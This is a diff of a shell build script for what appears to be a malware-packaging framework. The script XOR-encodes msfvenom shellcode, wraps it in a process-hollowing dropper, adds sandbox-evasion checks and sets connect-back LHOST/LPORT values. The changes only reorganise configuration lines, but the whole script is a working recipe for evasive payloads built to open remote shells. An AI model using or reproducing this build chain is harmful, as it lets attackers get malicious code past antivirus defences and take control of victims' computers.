@@ -18,6 +18,9 @@ cat banner.txt
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
 
+# import feature construction interface
+. build/feature_construction.sh
+
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
@@ -26,13 +29,15 @@ cat banner.txt
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
+# generate key file for payload
+generate_key preset aabbcc12de input/key_raw.txt
 # enable debug print into file because we probably can not easily reach stdout of the hollowed process
 enable_debug_print to_file C:/payload_log.txt
 #CONFIGURATION_END
 
-
-# import feature construction interface
-. build/feature_construction.sh
 
 # --- ---
 # GENERATE HOLLOWING PAYLOAD input/hollowing_payload.exe
@@ -49,18 +54,11 @@ add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
 add_evasion gethostbyname_sandbox_evasion 'this.that'
 reset_evasion_technique_counter
 
-# generate key file
-generate_key preset aabbcc12de input/key_raw.txt
-
 # encode msfvenom shellcode
 encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
 
 # array name buf is expected by static_from_file retrieval method
 ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
-
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
 
 # set shellcode source
 set_payload_source static_from_file input/scenc_c.txt
@@ -99,18 +97,21 @@ printf "\n+++ Generating dropper executable that performs hollowing +++\n"
 add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
 add_evasion gethostbyname_sandbox_evasion 'this.that'
 
-# generate key file
+
+#CONFIGURATION_START
+# no command preexec for dropper executable
+set_command_source no_data
+set_command_exec no_command
+# generate key file for dropper executable
 generate_key preset bbccdd34ef input/key_raw.txt
+#CONFIGURATION_END
+
 
 # encode hollowing payload
 encode_payload xor input/hollowing_payload.exe input/hollowing_payload_enc.txt input/key_raw.txt
 
 # array name buf is expected by static_from_file retrieval method
 ./tools/data_raw_to_c/data_raw_to_c input/hollowing_payload_enc.txt input/hollowing_payload_enc_c.txt buf
-
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
 
 # set payload source
 set_payload_source static_from_file input/hollowing_payload_enc_c.txt
